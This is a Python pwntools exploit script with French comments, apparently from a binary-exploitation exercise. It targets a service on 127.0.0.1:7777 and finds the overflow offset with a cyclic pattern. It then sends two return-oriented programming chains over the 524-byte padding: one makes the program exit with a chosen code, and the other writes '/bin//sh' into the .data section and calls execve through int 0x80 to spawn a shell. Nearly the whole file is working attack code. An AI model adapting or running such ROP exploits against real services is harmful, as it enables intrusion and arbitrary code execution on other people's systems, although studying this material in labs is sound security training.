#!/usr/bin/env python3
#coding: utf-8

from ast import Bytes
from typing import Literal
from pwn import *
from struct import pack

PORT = 7777
HOST = '127.0.0.1'
OFFSET= 524

DATA_ADDR = 0x080e4060

def find_offset() -> Literal:
    def send_cyclic(g: cyclic_gen, conn: remote):
        p = g.get(800)
        conn.send(p)

    def get_offset(g: cyclic_gen):
        eip_value = input("EIP value: ")
        eip_value = int(eip_value, base=16)
        offset = g.find(eip_value)
        print(f"l'offset se situe au {offset[0]} octets")
        return offset
    g = cyclic_gen()
    conn = remote(HOST,PORT)
    conn.recvline()
    send_cyclic(g, conn)
    offset = get_offset(g)
    conn.close()
    return offset[0]
    

def exit_custom_nb(nb):
    g = cyclic_gen()
    conn = remote(HOST,PORT)
    p = b''.join([
        b'A'*OFFSET,
        pack('<I', 0x0804ff10), # xor eax, eax ; ret
        pack('<I', 0x08088b3a), # inc eax ; ret
        pack('<I', 0x0804901e), # pop ebx ; ret
        pack('<I', nb),
        pack('<I', 0x0804ac72) # int 0x80
    ]) 
    conn.send(p)
    conn.close()

def local_shell():
    conn = remote(HOST,PORT)
    p = b''.join([
        b'A'*OFFSET,
        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR), # on met dans EDX l'addresse de .date
        pack('<I', 0x00000000), # on met EDI a 0
        pack('<I', 0x080af496), # pop eax ; ret
        pack('>I', 0x2f62696e), # /bin dans eax
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax ; ret # met /bin dans .data

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+4), # on l'addr de .data+4
        pack('<I', 0x00000000), # edi a 0
        pack('<I', 0x080af496), # pop eax ; ret
        pack('>I', 0x2f2f7368), # //sh dans eax
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax ; ret # met //sh après /bin dans .data

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+8), # et met dans edx l'addresse de .data+8
        pack('<I', 0x00000000), # EDI a 0
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax # en met des 0 à la fin

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+12), # et met dans edx l'addresse de .data+12
        pack('<I', 0x00000000), # EDI a 0
        pack('<I', 0x080af496), # pop eax ; ret
        pack('<I', DATA_ADDR), # eax = DATA_ADDR 
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax # en met DATA_ADDR à la suite de /bin//sh\0

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+16), # et met dans edx l'addresse de .data+16
        pack('<I', 0x00000000), # EDI a 0
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax # en met des 0 à la fin

        pack('<I', 0x0804901e), # pop ebx ; ret
        pack('<I', DATA_ADDR), # on l'addr de .data dans ebx

        pack('<I', 0x08063fb1), # pop ecx ; add al, 0xf6 ; ret
        pack('<I', DATA_ADDR+12), # ecx à DATA_ADDR+12 -> DATA_ADDR

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', 0x00000000), # edx à 0
        pack('<I', 0x00000000), # edi à 0

        pack('<I', 0x080af496), # pop eax ; ret
        pack('<I', 0x0b), # eax a 11

        pack('<I', 0x08079f8f) # int 0x80
    ])
    conn.send(p)
    conn.recvline()
    conn.close()

def main():
    #exit_custom_nb(3)
    local_shell()
    
if __name__ == '__main__':
    main()